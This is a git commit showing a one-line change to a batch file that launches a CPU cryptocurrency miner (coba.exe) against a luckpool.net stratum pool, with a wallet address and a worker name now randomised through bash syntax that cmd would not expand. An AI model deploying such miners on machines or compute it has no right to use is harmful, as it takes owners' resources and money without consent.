f05a8d212324bee9f588454dc7c0fb68f4964598
johanlamberto <90099227+johanlamberto@users.noreply.github.com>
2021-09-04 20:38:24 +0700

    Update coba.bat

--- coba.bat
+++ coba.bat
@@ -1,1 +1,1 @@
-coba.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RL4L78PHHABKN3VrSYkdS4JswfRQ1KE15Y.Mas-Gtg -p x --cpu 2
+coba.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RL4L78PHHABKN3VrSYkdS4JswfRQ1KE15Y.$(echo $(shuf -i 10-299 -n 1)-MART-XXX) -p x --cpu 2
